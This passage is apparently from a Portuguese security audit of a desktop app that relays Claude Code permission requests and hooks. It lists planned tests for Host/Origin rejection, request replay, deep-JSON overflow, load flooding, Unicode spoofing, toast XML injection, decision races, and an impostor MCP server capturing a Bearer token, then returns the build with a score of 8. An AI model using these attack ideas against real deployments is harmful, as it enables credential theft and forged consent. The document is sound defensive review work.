A leitura estática não prova o seguinte. Para cada item, o alvo executável mínimo:

1. Suíte Rust completa e cobertura no SHA: `cargo test --features desktop --locked`
   e `cargo llvm-cov ... --fail-under-lines 85`, nas três plataformas do CI.
2. Testes de processo do helper: `node --test scripts/verification/native-client.test.mjs`
   contra o helper release do SHA.
3. Auditoria atual: `cargo audit` nos dois lockfiles com a base de avisos do dia;
   `npm audit` em `app` e `docs-site`.
4. Novo teste: Host único estrangeiro, URI absoluta divergente e `OPTIONS` com
   Origin, em `/v1/health`, `/v1/hooks/*`, challenge e `/mcp`. Esperado: 403, sem CORS.
5. Novo teste: reenviar o par GET + POST capturado após o uso. Hoje deve passar
   (204), o que documenta F-03; depois da correção, 401.
6. Novo teste: JSON com 100 mil níveis no POST de hook e no stdin do helper.
   Esperado: 400 ou nenhuma saída, sem estouro de pilha.
7. Novo teste: cliente HTTP abre um `PermissionRequest` assinado e fecha o socket.
   Esperado: cartão `expired` em até 1 s e `resolve_decision` falhando.
   O comportamento do hyper ao detectar a queda não foi verificado.
8. Novo teste de carga: inundação concorrente de 1 MiB e cabeçalhos lentos sem
   chave, com um hook legítimo medido em paralelo.
9. Novo teste de UI (Vitest ou Playwright): alvo com `U+3164`, `U+00A0`, `U+2800`
   e espaço longo; foco vindo da notificação; tecla A.
10. Verificação nativa no Windows: toast com título `<b>&x</b>` e projeto `a&b`.
    Confirmar que não há injeção de XML no `tauri-winrt-notification 0.8.1`.
11. Teste de bytes: marcador em cartão, `clear_history` e poda; varrer `state.db`
    e confirmar ausência de `-journal` residual.
12. Teste de ACL do `connection.json` gravado por `write_private` (Windows `Get-Acl`
    e Unix 0600/0700).
13. Teste de corrida: duas threads chamando `resolve_decision` com `allow` e `deny`.
    Esperado: exatamente uma resposta entregue.
14. Ensaio do F-01: impostor MCP numa conta separada. Confirmar o envio do Bearer
    pelo Claude Code real e, depois da correção, a recusa.

## 6. Veredito

**C10 no SHA `42ecb7f`: DEVOLVIDO.**

A seção 13.3 exige nota 10 em Segurança na Fase 5. A nota 10 pede pelo menos 10
tentativas da seção 8.1 sem sucesso, cada uma com teste automatizado. Esta rodada
documenta 32 tentativas. 23 foram defendidas e 15 delas têm teste exato. Ainda
assim, há duas vulnerabilidades (A11 baixa, A15 média), seis parciais e uma não
verificada. Nenhum teste foi executado. Nessas condições a nota 10 não se sustenta.

Nota estática proposta para C: **8**. O núcleo é sólido: hooks com HMAC nos dois
sentidos, prova do servidor antes do envio, Origin e Host rejeitados, decisão só
por IPC com foco, armar e confirmar com 1 s, e nenhum caminho de falha que vire
consentimento. Os pontos abertos são médios ou baixos.

Para uma nova rodada: corrigir F-01 e F-02, fechar F-03, F-04 e F-07 com testes,
e trazer a execução dos itens 1 a 3 e 4 a 13 da seção 5 ligada ao SHA.
